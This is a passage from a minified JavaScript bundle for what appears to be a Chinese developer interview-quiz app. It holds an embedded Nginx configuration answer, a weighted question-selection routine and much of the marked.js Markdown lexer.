80;\\n        server_name  localhost;\\n\\n        location / {\\n            root   html;\\n            index  index.html index.htm;\\n        }\\n        # 错误页面\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理\\n        location /data {\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n}\\n</code></pre>\\n</details>","ast":[{"type":"space","raw":"\\n"},{"type":"heading","raw":"# Nginx\\n\\n","depth":1,"text":"Nginx","tokens":[{"type":"text","raw":"Nginx","text":"Nginx","escaped":false}]},{"type":"heading","raw":"## 基础配置\\n\\n","depth":2,"text":"基础配置","tokens":[{"type":"text","raw":"基础配置","text":"基础配置","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"code","raw":"```conf\\n# Nginx 启动时创建的 worker 进程的数量\\nworker_processes  1;\\n\\n# 配置 Nginx 主进程的 PID 文件路径\\n#pid        logs/nginx.pid;\\n\\nevents {\\n    # 指定每个 worker 进程可以同时处理的最大连接数\\n    worker_connections  1024;\\n}\\n\\nhttp {\\n    include       mime.types;\\n    default_type  application/octet-stream;\\n\\n    # 提高文件传输的效率，特别是对于大文件来说\\n    sendfile        on;\\n    # 用于减少网络传输中的数据包数量，通过将多个小数据包合并成一个大数据包来提高网络传输的效率\\n    tcp_nopush     on;\\n\\n    # 指定了空闲连接的超时时间，即客户端和服务器之间保持连接的最长时间\\n    # 在这里，连接在 65 秒内没有任何活动就会被关闭。通过调整此值，您可以控制服务器上空闲连接的数量，以及资源的有效利用程度\\n    keepalive_timeout  65;\\n\\n    # 启用 HTTP 响应的压缩功能，以减少传输的数据量，提高网络传输效率\\n    gzip  on;\\n\\n    server {\\n        # 端口\\n        listen       8099;\\n        server_name  localhost;\\n        \\n        location / {\\n            root html-vue;\\n            # hash 路由的重定向\\n            try_files $uri $uri/ /index.html;\\n            index index.html;\\n            # 跨域\\n            add_header \'Access-Control-Allow-Origin\' \'*\';\\n            # 允许跨域请求的方法包括 GET、POST 和 OPTIONS\\n            add_header \'Access-Control-Allow-Methods\' \'GET, POST, OPTIONS\';\\n            # 允许跨域请求携带的自定义请求头\\n            add_header \'Access-Control-Allow-Headers\' \'DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type\';\\n            \\n            # 确保浏览器在使用缓存前必须与服务器确认资源是否被修改过\\n            if ($request_filename ~* ^.*?.(html|htm|js)$) {\\n              add_header Cache-Control no-cache;\\n            }\\n        }\\n\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理 - 作用是不在 vue 项目中写死 ip\\n        # 这样配置后，再也不用给前端里面写固定的 ip\\n        location /data {\\n            # 删除 url 中的 /data 但是目前貌似不生效\\n            # rewrite ^/data/(.*)$ /$1 break;\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n\\n    # 基础访问\\n    server {\\n        listen       80;\\n        server_name  localhost;\\n\\n        location / {\\n            root   html;\\n            index  index.html index.htm;\\n        }\\n        # 错误页面\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理\\n        location /data {\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n}\\n```","lang":"conf","text":"# Nginx 启动时创建的 worker 进程的数量\\nworker_processes  1;\\n\\n# 配置 Nginx 主进程的 PID 文件路径\\n#pid        logs/nginx.pid;\\n\\nevents {\\n    # 指定每个 worker 进程可以同时处理的最大连接数\\n    worker_connections  1024;\\n}\\n\\nhttp {\\n    include       mime.types;\\n    default_type  application/octet-stream;\\n\\n    # 提高文件传输的效率，特别是对于大文件来说\\n    sendfile        on;\\n    # 用于减少网络传输中的数据包数量，通过将多个小数据包合并成一个大数据包来提高网络传输的效率\\n    tcp_nopush     on;\\n\\n    # 指定了空闲连接的超时时间，即客户端和服务器之间保持连接的最长时间\\n    # 在这里，连接在 65 秒内没有任何活动就会被关闭。通过调整此值，您可以控制服务器上空闲连接的数量，以及资源的有效利用程度\\n    keepalive_timeout  65;\\n\\n    # 启用 HTTP 响应的压缩功能，以减少传输的数据量，提高网络传输效率\\n    gzip  on;\\n\\n    server {\\n        # 端口\\n        listen       8099;\\n        server_name  localhost;\\n        \\n        location / {\\n            root html-vue;\\n            # hash 路由的重定向\\n            try_files $uri $uri/ /index.html;\\n            index index.html;\\n            # 跨域\\n            add_header \'Access-Control-Allow-Origin\' \'*\';\\n            # 允许跨域请求的方法包括 GET、POST 和 OPTIONS\\n            add_header \'Access-Control-Allow-Methods\' \'GET, POST, OPTIONS\';\\n            # 允许跨域请求携带的自定义请求头\\n            add_header \'Access-Control-Allow-Headers\' \'DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type\';\\n            \\n            # 确保浏览器在使用缓存前必须与服务器确认资源是否被修改过\\n            if ($request_filename ~* ^.*?.(html|htm|js)$) {\\n              add_header Cache-Control no-cache;\\n            }\\n        }\\n\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理 - 作用是不在 vue 项目中写死 ip\\n        # 这样配置后，再也不用给前端里面写固定的 ip\\n        location /data {\\n            # 删除 url 中的 /data 但是目前貌似不生效\\n            # rewrite ^/data/(.*)$ /$1 break;\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n\\n    # 基础访问\\n    server {\\n        listen       80;\\n        server_name  localhost;\\n\\n        location / {\\n            root   html;\\n            index  index.html index.htm;\\n        }\\n        # 错误页面\\n        error_page   500 502 503 504  /50x.html;\\n        location = /50x.html {\\n            root   html;\\n        }\\n\\n        # 跨域代理\\n        location /data {\\n            proxy_pass http://192.168.31.214:3000;\\n        }\\n    }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>","pre":false,"text":"</details>"}]}]');let Ce=null;const Ka={初级:{基础:.6,编程:.3,业务:.1,架构:0,管理:0,拓展:0},中级:{基础:.2,编程:.6,业务:.1,架构:.1,管理:0,拓展:0},高级:{基础:.1,编程:.2,业务:.5,架构:.1,管理:0,拓展:.1},架构:{基础:.1,编程:.1,业务:.1,架构:.5,管理:.1,拓展:.1},专家:{基础:.1,编程:.1,业务:.1,架构:.3,管理:.2,拓展:.2}},Xo=e=>{const t=e.ast,a=[];let n=null,s=0;return t.forEach(r=>{if(r.type==="heading"&&r.depth===2)n&&a.push({...n,score:s}),n={title:r.text,type:"",score:0,text:""},s=0;else if(r.type==="heading"&&r.depth===4){if(r.text.startsWith("类型："))n.type=r.text.replace("类型：","").trim().replace(/^`(.*)`$/,"$1");else if(r.text.startsWith("解答（")){const p=r.text.match(/解答\s*（\s*(\d+)\s*分\s*）/i);p&&(s=parseInt(p[1],10))}}else n&&r.type!=="heading"&&(n.text+=r.raw)}),n&&a.push({...n,score:s}),a},Lc=(e,t)=>{const a=Ka[t]||Ka.初级,n=e.reduce((p,o)=>(p[o.type]||(p[o.type]=[]),p[o.type].push(o),p),{}),s=[];let r=0;for(;r<100;)for(const p in a){const o=n[p]||[],l=a[p],c=Math.ceil(l*100);for(let i=0;i<c;i++){if(o.length===0)continue;const f=Math.floor(Math.random()*o.length),y=o.splice(f,1)[0];if(r+y.score<=100&&(s.push(y),r+=y.score),r>=100)break}if(r>=100)break}for(;r<100;){const p=e.filter(c=>!s.includes(c)),o=Math.floor(Math.random()*p.length),l=p[o];r+l.score<=100&&(s.push(l),r+=l.score)}return s},Ac=()=>(Ce!=null&&Ce.length||(Ce=Go.map(e=>Xo(e)).flat().filter(e=>e.text)),Ce);function wa(){return{async:!1,breaks:!1,extensions:null,gfm:!0,hooks:null,pedantic:!1,renderer:null,silent:!1,tokenizer:null,walkTokens:null}}let be=wa();function Zn(e){be=e}const Ue={exec:()=>null};function _(e,t=""){let a=typeof e=="string"?e:e.source;const n={replace:(s,r)=>{let p=typeof r=="string"?r:r.source;return p=p.replace($.caret,"$1"),a=a.replace(s,p),n},getRegex:()=>new RegExp(a,t)};return n}const $={codeRemoveIndent:/^(?: {1,4}| {0,3}\t)/gm,outputLinkReplace:/\\([\[\]])/g,indentCodeCompensation:/^(\s+)(?:```)/,beginningSpace:/^\s+/,endingHash:/#$/,startingSpaceChar:/^ /,endingSpaceChar:/ $/,nonSpaceChar:/[^ ]/,newLineCharGlobal:/\n/g,tabCharGlobal:/\t/g,multipleSpaceGlobal:/\s+/g,blankLine:/^[ \t]*$/,doubleBlankLine:/\n[ \t]*\n[ \t]*$/,blockquoteStart:/^ {0,3}>/,blockquoteSetextReplace:/\n {0,3}((?:=+|-+) *)(?=\n|$)/g,blockquoteSetextReplace2:/^ {0,3}>[ \t]?/gm,listReplaceTabs:/^\t+/,listReplaceNesting:/^ {1,4}(?=( {4})*[^ ])/g,listIsTask:/^\[[ xX]\] /,listReplaceTask:/^\[[ xX]\] +/,anyLine:/\n.*\n/,hrefBrackets:/^<(.*)>$/,tableDelimiter:/[:|]/,tableAlignChars:/^\||\| *$/g,tableRowBlankLine:/\n[ \t]*$/,tableAlignRight:/^ *-+: *$/,tableAlignCenter:/^ *:-+: *$/,tableAlignLeft:/^ *:-+ *$/,startATag:/^<a /i,endATag:/^<\/a>/i,startPreScriptTag:/^<(pre|code|kbd|script)(\s|>)/i,endPreScriptTag:/^<\/(pre|code|kbd|script)(\s|>)/i,startAngleBracket:/^</,endAngleBracket:/>$/,pedanticHrefTitle:/^([^'"]*[^\s])\s+(['"])(.*)\2/,unicodeAlphaNumeric:/[\p{L}\p{N}]/u,escapeTest:/[&<>"']/,escapeReplace:/[&<>"']/g,escapeTestNoEncode:/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/,escapeReplaceNoEncode:/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/g,unescapeTest:/&(#(?:\d+)|(?:#x[0-9A-Fa-f]+)|(?:\w+));?/ig,caret:/(^|[^\[])\^/g,percentDecode:/%25/g,findPipe:/\|/g,splitPipe:/ \|/,slashPipe:/\\\|/g,carriageReturn:/\r\n|\r/g,spaceLine:/^ +$/gm,notSpaceStart:/^\S*/,endingNewline:/\n$/,listItemRegex:e=>new RegExp(`^( {0,3}${e})((?:[	 ][^\\n]*)?(?:\\n|$))`),nextBulletRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}(?:[*+-]|\\d{1,9}[.)])((?:[ 	][^\\n]*)?(?:\\n|$))`),hrRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}((?:- *){3,}|(?:_ *){3,}|(?:\\* *){3,})(?:\\n+|$)`),fencesBeginRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}(?:\`\`\`|~~~)`),headingBeginRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}#`),htmlBeginRegex:e=>new RegExp(`^ {0,${Math.min(3,e-1)}}<(?:[a-z].*>|!--)`,"i")},Ko=/^(?:[ \t]*(?:\n|$))+/,Yo=/^((?: {4}| {0,3}\t)[^\n]+(?:\n(?:[ \t]*(?:\n|$))*)?)+/,Qo=/^ {0,3}(`{3,}(?=[^`\n]*(?:\n|$))|~{3,})([^\n]*)(?:\n|$)(?:|([\s\S]*?)(?:\n|$))(?: {0,3}\1[~`]* *(?=\n|$)|$)/,Ye=/^ {0,3}((?:-[\t ]*){3,}|(?:_[ \t]*){3,}|(?:\*[ \t]*){3,})(?:\n+|$)/,Zo=/^ {0,3}(#{1,6})(?=\s|$)(.*)(?:\n+|$)/,es=/(?:[*+-]|\d{1,9}[.)])/,ts=_(/^(?!bull |blockCode|fences|blockquote|heading|html)((?:.|\n(?!\s*?\n|bull |blockCode|fences|blockquote|heading|html))+?)\n {0,3}(=+|-+) *(?:\n+|$)/).replace(/bull/g,es).replace(/blockCode/g,/(?: {4}| {0,3}\t)/).replace(/fences/g,/ {0,3}(?:`{3,}|~{3,})/).replace(/blockquote/g,/ {0,3}>/).replace(/heading/g,/ {0,3}#{1,6}/).replace(/html/g,/ {0,3}<[^\n>]+>\n/).getRegex(),fa=/^([^\n]+(?:\n(?!hr|heading|lheading|blockquote|fences|list|html|table| +\n)[^\n]+)*)/,el=/^[^\n]+/,ha=/(?!\s*\])(?:\\.|[^\[\]\\])+/,tl=_(/^ {0,3}\[(label)\]: *(?:\n[ \t]*)?([^<\s][^\s]*|<.*?>)(?:(?: +(?:\n[ \t]*)?| *\n[ \t]*)(title))? *(?:\n+|$)/).replace("label",ha).replace("title",/(?:"(?:\\"?|[^"\\])*"|'[^'\n]*(?:\n[^'\n]+)*\n?'|\([^()]*\))/).getRegex(),al=_(/^( {0,3}bull)([ \t][^\n]+?)?(?:\n|$)/).replace(/bull/g,es).getRegex(),vt="address|article|aside|base|basefont|blockquote|body|caption|center|col|colgroup|dd|details|dialog|dir|div|dl|dt|fieldset|figcaption|figure|footer|form|frame|frameset|h[1-6]|head|header|hr|html|iframe|legend|li|link|main|menu|menuitem|meta|nav|noframes|ol|optgroup|option|p|param|search|section|summary|table|tbody|td|tfoot|th|thead|title|tr|track|ul",ua=/<!--(?:-?>|[\s\S]*?(?:-->|$))/,nl=_("^ {0,3}(?:<(script|pre|style|textarea)[\\s>][\\s\\S]*?(?:</\\1>[^\\n]*\\n+|$)|comment[^\\n]*(\\n+|$)|<\\?[\\s\\S]*?(?:\\?>\\n*|$)|<![A-Z][\\s\\S]*?(?:>\\n*|$)|<!\\[CDATA\\[[\\s\\S]*?(?:\\]\\]>\\n*|$)|</?(tag)(?: +|\\n|/?>)[\\s\\S]*?(?:(?:\\n[ 	]*)+\\n|$)|<(?!script|pre|style|textarea)([a-z][\\w-]*)(?:attribute)*? */?>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n[ 	]*)+\\n|$)|</(?!script|pre|style|textarea)[a-z][\\w-]*\\s*>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n[ 	]*)+\\n|$))","i").replace("comment",ua).replace("tag",vt).replace("attribute",/ +[a-zA-Z:_][\w.:-]*(?: *= *"[^"\n]*"| *= *'[^'\n]*'| *= *[^\s"'=<>`]+)?/).getRegex(),as=_(fa).replace("hr",Ye).replace("heading"," {0,3}#{1,6}(?:\\s|$)").replace("|lheading","").replace("|table","").replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",vt).getRegex(),sl=_(/^( {0,3}> ?(paragraph|[^\n]*)(?:\n|$))+/).replace("paragraph",as).getRegex(),Wa={blockquote:sl,code:Yo,def:tl,fences:Qo,heading:Zo,hr:Ye,html:nl,lheading:ts,list:al,newline:Ko,paragraph:as,table:Ue,text:el},Ya=_("^ *([^\\n ].*)\\n {0,3}((?:\\| *)?:?-+:? *(?:\\| *:?-+:? *)*(?:\\| *)?)(?:\\n((?:(?! *\\n|hr|heading|blockquote|code|fences|list|html).*(?:\\n|$))*)\\n*|$)").replace("hr",Ye).replace("heading"," {0,3}#{1,6}(?:\\s|$)").replace("blockquote"," {0,3}>").replace("code","(?: {4}| {0,3}	)[^\\n]").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",vt).getRegex(),rl={...Wa,table:Ya,paragraph:_(fa).replace("hr",Ye).replace("heading"," {0,3}#{1,6}(?:\\s|$)").replace("|lheading","").replace("table",Ya).replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",vt).getRegex()},pl={...Wa,html:_(`^ *(?:comment *(?:\\n|\\s*$)|<(tag)[\\s\\S]+?</\\1> *(?:\\n{2,}|\\s*$)|<tag(?:"[^"]*"|'[^']*'|\\s[^'"/>\\s]*)*?/?> *(?:\\n{2,}|\\s*$))`).replace("comment",ua).replace(/tag/g,"(?!(?:a|em|strong|small|s|cite|q|dfn|abbr|data|time|code|var|samp|kbd|sub|sup|i|b|u|mark|ruby|rt|rp|bdi|bdo|span|br|wbr|ins|del|img)\\b)\\w+(?!:|[^\\w\\s@]*@)\\b").getRegex(),def:/^ *\[([^\]]+)\]: *<?([^\s>]+)>?(?: +(["(][^\n]+[")]))? *(?:\n+|$)/,heading:/^(#{1,6})(.*)(?:\n+|$)/,fences:Ue,lheading:/^(.+?)\n {0,3}(=+|-+) *(?:\n+|$)/,paragraph:_(fa).replace("hr",Ye).replace("heading",` *#{1,6} *[^
]`).replace("lheading",ts).replace("|table","").replace("blockquote"," {0,3}>").replace("|fences","").replace("|list","").replace("|html","").replace("|tag","").getRegex()},ol=/^\\([!"#$%&'()*+,\-./:;<=>?@\[\]\\^_`{|}~])/,ll=/^(`+)([^`]|[^`][\s\S]*?[^`])\1(?!`)/,ns=/^( {2,}|\\)\n(?!\s*$)/,cl=/^(`+|[^`])(?:(?= {2,}\n)|[\s\S]*?(?:(?=[\\<!\[`*_]|\b_|$)|[^ ](?= {2,}\n)))/,Ct=/[\p{P}\p{S}]/u,ga=/[\s\p{P}\p{S}]/u,ss=/[^\s\p{P}\p{S}]/u,dl=_(/^((?![*_])punctSpace)/,"u").replace(/punctSpace/g,ga).getRegex(),rs=/(?!~)[\p{P}\p{S}]/u,il=/(?!~)[\s\p{P}\p{S}]/u,xl=/(?:[^\s\p{P}\p{S}]|~)/u,yl=/\[[^[\]]*?\]\((?:\\.|[^\\\(\)]|\((?:\\.|[^\\\(\)])*\))*\)|`[^`]*?`|<[^<>]*?>/g,ps=/^(?:\*+(?:((?!\*)punct)|[^\s*]))|^_+(?:((?!_)punct)|([^\s_]))/,wl=_(ps,"u").replace(/punct/g,Ct).getRegex(),fl=_(ps,"u").replace(/punct/g,rs).getRegex(),os="^[^_*]*?__[^_*]*?\\*[^_*]*?(?=__)|[^*]+(?=[^*])|(?!\\*)punct(\\*+)(?=[\\s]|$)|notPunctSpace(\\*+)(?!\\*)(?=punctSpace|$)|(?!\\*)punctSpace(\\*+)(?=notPunctSpace)|[\\s](\\*+)(?!\\*)(?=punct)|(?!\\*)punct(\\*+)(?!\\*)(?=punct)|notPunctSpace(\\*+)(?=notPunctSpace)",hl=_(os,"gu").replace(/notPunctSpace/g,ss).replace(/punctSpace/g,ga).replace(/punct/g,Ct).getRegex(),ul=_(os,"gu").replace(/notPunctSpace/g,xl).replace(/punctSpace/g,il).replace(/punct/g,rs).getRegex(),Wl=_("^[^_*]*?\\*\\*[^_*]*?_[^_*]*?(?=\\*\\*)|[^_]+(?=[^_])|(?!_)punct(_+)(?=[\\s]|$)|notPunctSpace(_+)(?!_)(?=punctSpace|$)|(?!_)punctSpace(_+)(?=notPunctSpace)|[\\s](_+)(?!_)(?=punct)|(?!_)punct(_+)(?!_)(?=punct)","gu").replace(/notPunctSpace/g,ss).replace(/punctSpace/g,ga).replace(/punct/g,Ct).getRegex(),gl=_(/\\(punct)/,"gu").replace(/punct/g,Ct).getRegex(),kl=_(/^<(scheme:[^\s\x00-\x1f<>]*|email)>/).replace("scheme",/[a-zA-Z][a-zA-Z0-9+.-]{1,31}/).replace("email",/[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+(@)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+(?![-_])/).getRegex(),ml=_(ua).replace("(?:-->|$)","-->").getRegex(),Sl=_("^comment|^</[a-zA-Z][\\w:-]*\\s*>|^<[a-zA-Z][\\w-]*(?:attribute)*?\\s*/?>|^<\\?[\\s\\S]*?\\?>|^<![a-zA-Z]+\\s[\\s\\S]*?>|^<!\\[CDATA\\[[\\s\\S]*?\\]\\]>").replace("comment",ml).replace("attribute",/\s+[a-zA-Z:_][\w.:-]*(?:\s*=\s*"[^"]*"|\s*=\s*'[^']*'|\s*=\s*[^\s"'=<>`]+)?/).getRegex(),ht=/(?:\[(?:\\.|[^\[\]\\])*\]|\\.|`[^`]*`|[^\[\]\\`])*?/,bl=_(/^!?\[(label)\]\(\s*(href)(?:\s+(title))?\s*\)/).replace("label",ht).replace("href",/<(?:\\.|[^\n<>\\])+>|[^\s\x00-\x1f]*/).replace("title",/"(?:\\"?|[^"\\])*"|'(?:\\'?|[^'\\])*'|\((?:\\\)?|[^)\\])*\)/).getRegex(),ls=_(/^!?\[(label)\]\[(ref)\]/).replace("label",ht).replace("ref",ha).getRegex(),cs=_(/^!?\[(ref)\](?:\[\])?/).replace("ref",ha).getRegex(),Tl=_("reflink|nolink(?!\\()","g").replace("reflink",ls).replace("nolink",cs).getRegex(),ka={_backpedal:Ue,anyPunctuation:gl,autolink:kl,blockSkip:yl,br:ns,code:ll,del:Ue,emStrongLDelim:wl,emStrongRDelimAst:hl,emStrongRDelimUnd:Wl,escape:ol,link:bl,nolink:cs,punctuation:dl,reflink:ls,reflinkSearch:Tl,tag:Sl,text:cl,url:Ue},vl={...ka,link:_(/^!?\[(label)\]\((.*?)\)/).replace("label",ht).getRegex(),reflink:_(/^!?\[(label)\]\s*\[([^\]]*)\]/).replace("label",ht).getRegex()},Kt={...ka,emStrongRDelimAst:ul,emStrongLDelim:fl,url:_(/^((?:ftp|https?):\/\/|www\.)(?:[a-zA-Z0-9\-]+\.?)+[^\s<]*|^email/,"i").replace("email",/[A-Za-z0-9._+-]+(@)[a-zA-Z0-9-_]+(?:\.[a-zA-Z0-9-_]*[a-zA-Z0-9])+(?![-_])/).getRegex(),_backpedal:/(?:[^?!.,:;*_'"~()&]+|\([^)]*\)|&(?![a-zA-Z0-9]+;$)|[?!.,:;*_'"~)]+(?!$))+/,del:/^(~~?)(?=[^\s~])((?:\\.|[^\\])*?(?:\\.|[^\s~\\]))\1(?=[^~]|$)/,text:/^([`~]+|[^`~])(?:(?= {2,}\n)|(?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)|[\s\S]*?(?:(?=[\\<!\[`*~_]|\b_|https?:\/\/|ftp:\/\/|www\.|$)|[^ ](?= {2,}\n)|[^a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-](?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)))/},Cl={...Kt,br:_(ns).replace("{2,}","*").getRegex(),text:_(Kt.text).replace("\\b_","\\b_| {2,}\\n").replace(/\{2,\}/g,"*").getRegex()},st={normal:Wa,gfm:rl,pedantic:pl},je={normal:ka,gfm:Kt,breaks:Cl,pedantic:vl},Pl={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"},Qa=e=>Pl[e];function oe(e,t){if(t){if($.escapeTest.test(e))return e.replace($.escapeReplace,Qa)}else if($.escapeTestNoEncode.test(e))return e.replace($.escapeReplaceNoEncode,Qa);return e}function Za(e){try{e=encodeURI(e).replace($.percentDecode,"%")}catch{return null}return e}function en(e,t){var r;const a=e.replace($.findPipe,(p,o,l)=>{let c=!1,i=o;for(;--i>=0&&l[i]==="\\";)c=!c;return c?"|":" |"}),n=a.split($.splitPipe);let s=0;if(n[0].trim()||n.shift(),n.length>0&&!((r=n.at(-1))!=null&&r.trim())&&n.pop(),t)if(n.length>t)n.splice(t);else for(;n.length<t;)n.push("");for(;s<n.length;s++)n[s]=n[s].trim().replace($.slashPipe,"|");return n}function Ie(e,t,a){const n=e.length;if(n===0)return"";let s=0;for(;s<n&&e.charAt(n-s-1)===t;)s++;return e.slice(0,n-s)}function Rl(e,t){if(e.indexOf(t[1])===-1)return-1;let a=0;for(let n=0;n<e.length;n++)if(e[n]==="\\")n++;else if(e[n]===t[0])a++;else if(e[n]===t[1]&&(a--,a<0))return n;return-1}function tn(e,t,a,n,s){const r=t.href,p=t.title||null,o=e[1].replace(s.other.outputLinkReplace,"$1");if(e[0].charAt(0)!=="!"){n.state.inLink=!0;const l={type:"link",raw:a,href:r,title:p,text:o,tokens:n.inlineTokens(o)};return n.state.inLink=!1,l}return{type:"image",raw:a,href:r,title:p,text:o}}function Ml(e,t,a){const n=e.match(a.other.indentCodeCompensation);if(n===null)return t;const s=n[1];return t.split(`
`).map(r=>{const p=r.match(a.other.beginningSpace);if(p===null)return r;const[o]=p;return o.length>=s.length?r.slice(s.length):r}).join(`
`)}class ut{constructor(t){L(this,"options");L(this,"rules");L(this,"lexer");this.options=t||be}space(t){const a=this.rules.block.newline.exec(t);if(a&&a[0].length>0)return{type:"space",raw:a[0]}}code(t){const a=this.rules.block.code.exec(t);if(a){const n=a[0].replace(this.rules.other.codeRemoveIndent,"");return{type:"code",raw:a[0],codeBlockStyle:"indented",text:this.options.pedantic?n:Ie(n,`
`)}}}fences(t){const a=this.rules.block.fences.exec(t);if(a){const n=a[0],s=Ml(n,a[3]||"",this.rules);return{type:"code",raw:n,lang:a[2]?a[2].trim().replace(this.rules.inline.anyPunctuation,"$1"):a[2],text:s}}}heading(t){const a=this.rules.block.heading.exec(t);if(a){let n=a[2].trim();if(this.rules.other.endingHash.test(n)){const s=Ie(n,"#");(this.options.pedantic||!s||this.rules.other.endingSpaceChar.test(s))&&(n=s.trim())}return{type:"heading",raw:a[0],depth:a[1].length,text:n,tokens:this.lexer.inline(n)}}}hr(t){const a=this.rules.block.hr.exec(t);if(a)return{type:"hr",raw:Ie(a[0],`
`)}}blockquote(t){const a=this.rules.block.blockquote.exec(t);if(a){let n=Ie(a[0],`
`).split(`
`),s="",r="";const p=[];for(;n.length>0;){let o=!1;const l=[];let c;for(c=0;c<n.length;c++)if(this.rules.other.blockquoteStart.test(n[c]))l.push(n[c]),o=!0;else if(!o)l.push(n[c]);else break;n=n.slice(c);const i=l.join(`
`),f=i.replace(this.rules.other.blockquoteSetextReplace,`
    $1`).replace(this.rules.other.blockquoteSetextReplace2,"");s=s?`${s}
${i}`:i,r=r?`${r}
${f}`:f;const y=this.lexer.state.top;if(this.lexer.state.top=!0,this.lexer.blockTokens(f,p,!0),this.lexer.state.top=y,n.length===0)break;const u=p.at(-1);if((u==null?void 0:u.type)==="code")break;if((u==null?void 0:u.type)==="blockquote"){const g=u,b=g.raw+`
`+n.join(`
`),I=this.blockquote(b);p[p.length-1]=I,s=s.substring(0,s.length-g.raw.length)+I.raw,r=r.substring(0,r.length-g.text.length)+I.text;break}else if((u==null?void 0:u.type)==="list"){const g=u,b=g.raw+`
`+n.join(`
`),I=this.list(b);p[p.length-1]=I,s=s.substring(0,s.length-u.raw.length)+I.raw,r=r.substring(0,r.length-g.raw.length)+I.raw,n=b.substring(p.at(-1).raw.length).split(`
`);continue}}return{type:"blockquote",raw:s,tokens:p,text:r}}}list(t){let a=this.rules.block.list.exec(t);if(a){let n=a[1].trim();const s=n.length>1,r={type:"list",raw:"",ordered:s,start:s?+n.slice(0,-1):"",loose:!1,items:[]};n=s?`\\d{1,9}\\${n.slice(-1)}`:`\\${n}`,this.options.pedantic&&(n=s?n:"[*+-]");const p=this.rules.other.listItemRegex(n);let o=!1;for(;t;){let c=!1,i="",f="";if(!(a=p.exec(t))||this.rules.block.hr.test(t))break;i=a[0],t=t.substring(i.length);let y=a[2].split(`
`,1)[0].replace(this.rules.other.listReplaceTabs,K=>" ".repeat(3*K.length)),u=t.split(`
`,1)[0],g=!y.trim(),b=0;if(this.options.pedantic?(b=2,f=y.trimStart()):g?b=a[1].length+1:(b=a[2].search(this.rules.other.nonSpaceChar),b=b>4?1:b,f=y.slice(b),b+=a[1].length),g&&this.rules.other.blankLine.test(u)&&(i+=u+`
`,t=t.substring(u.length+1),c=!0),!c){const K=this.rules.other.nextBulletRegex(b),se=this.rules.other.hrRegex(b),Y=this.rules.other.fencesBeginRegex(b),Q=this.rules.other.headingBeginRegex(b),J=this.rules.other.htmlBeginRegex(b);for(;t;){const we=t.split(`
